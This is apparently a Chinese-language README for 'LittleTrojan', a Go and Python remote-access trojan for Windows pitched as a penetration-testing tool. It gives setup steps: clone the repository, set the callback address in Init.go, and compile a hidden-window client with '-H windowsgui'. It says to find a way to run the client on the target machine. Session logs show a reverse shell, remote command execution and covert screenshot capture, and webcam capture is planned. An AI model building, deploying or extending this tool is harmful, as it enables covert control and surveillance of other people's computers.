# LittleTrojan

![](https://raw.githubusercontent.com/littlewith/LittleTrojan/master/Logo.png)

## LittleTrojan是什么
* 是一个利用Golang和Python实现的Windows远程控制工具。
* Client使用Golang实现，Server使用python实现，两者通过socket套接字通信。
* Client通过反向连接客户端来反弹shell。
* 最终实现的目的是替代或者等同metasploit、cobalt strike等渗透测试工具。

## LittleTrojan怎么运行
* 你可能需要使用VPS或者内网穿透等转发工具，确保客户端能够反向连接到你。
* 拉取最新的项目
```bash
git clone https://github.com/littlewith/LittleTrojan
```
* 目前仅为Demo版本，暂不支持加密通信和自定义生成木马，以后会进行功能完善。
* 在你的远程机器上运行客户端，需要安装相应的python版本。

```bash
# 不传入参数就可以查看详细的操作，当出现错误，会提示出错的原因。

python Server2.py

                    DreamShell ---> HELP DOCUMENT
                    -----------------------------
                    Launch service:   Server -a [--addr] (you ip) -p [--port] (your port)
                    when in command:   [command]
                    when in shell:  [cmd-shell]  or  [bash-shell]
                    -----------------------------
                    Some useful commands:
                    exit --> close the handler and stop the client process
                    restart --> restart the handler
                    screenshot --> take a screenshot on the screen
                    camerashot --> take a photo use the camera on the client
The addr or port seems not useful!
Please try again!

# 直接通过参数来指定监听的地址（0.0.0.0表示一切）和监听的端口（4433端口）（端口需要在Init.go中进行修改）

python Server2.py -a 0.0.0.0 -p 4433
0.0.0.0 4433
Service Launch! Listen on  0.0.0.0 : 4433
```

* 在Init.go文件中更改一下要连接的ip和端口
```go
client.connect("127.0.0.1", 4433)
```

* 在本地编译客户端或者在远程编译客户端，想办法在远程机器上面进行执行客户端。
```bash
go build GoTrojan -ldflags="-H windowsgui -w -s"
go_build_GoTrojan.exe
```

* 连接成功，服务端出现提示
```bash
0.0.0.0 4433
Service Launch! Listen on  0.0.0.0 : 4433
Starting convert with  ('127.0.0.1', 14083)
Tue May  2 09:38:13 2023
'127.0.0.1', 14083 (command)>shell
Starting shell.....
Tue May  2 09:38:22 2023
'127.0.0.1', 14083 (shell)>
```

## LittleTrojan常用的命令

1.获取客户端的命令行: shell
```bash
# 通过shell命令即可直接得到客户端的shell

Service Launch! Listen on  0.0.0.0 : 1234
Starting convert with  ('192.168.23.1', 1285)
Tue May  2 10:00:03 2023
'192.168.23.1', 1285 (command)>shell
Starting shell.....
Tue May  2 10:00:12 2023
'192.168.23.1', 1285 (shell)>whoami
legion-r7000p\andy

Tue May  2 10:00:15 2023
'192.168.23.1', 1285 (shell)>
```

2.返回或者退出: exit
```bash
# 当命令处于第一层的时候，会直接退出客户端，例如从command退出，注意会直接断线！

'192.168.23.1', 1285 (command)>exit
('192.168.23.1', 1285) Waiting handler to exit...
The handler is exited successfully: Bye!
Service Launch! Listen on  0.0.0.0 : 1234

# 当命令不处于第一层的时候，可以返回上一层，例如从shell返回到command

'192.168.23.1', 1285 (shell)>exit
Back on command...
Tue May  2 10:02:50 2023
'192.168.23.1', 1285 (command)>

```

3.捕获屏幕: screenshot
```bash
# 捕获屏幕的数据会直接存储在服务器的当前目录下

Service Launch! Listen on  0.0.0.0 : 1234
Starting convert with  ('192.168.23.1', 1436)
Tue May  2 10:05:32 2023
'192.168.23.1', 1436 (command)>screenshot
screenshot-Len: 253
screenshot saved! File name is: ./screenshot535.png
Tue May  2 10:05:56 2023
'192.168.23.1', 1436 (command)>
```

4.捕获摄像头: camerashot
```bash
# 和捕获屏幕类似，捕获摄像头的图像也会传回服务器（目前还未实现）
```

5.重启服务: restart
```bash
# 如果当前连接出现问题，当回到command界面的时候，可以直接使用restart命令来重启连接

'192.168.23.1', 1934 (command)>restart
The handler will be restarted....Waiting...
Service Launch! Listen on  0.0.0.0 : 1234
Starting convert with  ('192.168.23.1', 1937)
Tue May  2 10:25:10 2023
'192.168.23.1', 1937 (command)>
```
